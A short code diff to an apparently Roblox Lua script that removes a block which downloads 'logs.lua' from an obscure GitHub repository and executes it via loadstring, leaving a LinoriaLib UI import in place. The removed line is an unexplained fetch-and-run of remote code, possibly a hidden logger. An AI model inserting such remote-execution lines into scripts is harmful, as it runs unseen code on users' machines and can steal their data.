@@ -1,13 +1,4 @@
 -- Import the external script
-local success, result = pcall(function()
-    return loadstring(game:HttpGet("https://raw.githubusercontent.com/ffavex/AHfahf1r1-rah/main/logs.lua"))()
-end)
-
-if not success then
-    warn("Failed to load external script:", result)
-else
-    print("External script executed successfully.")
-end
 
 -- Import LinoriaLib components from GitHub
 local repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'
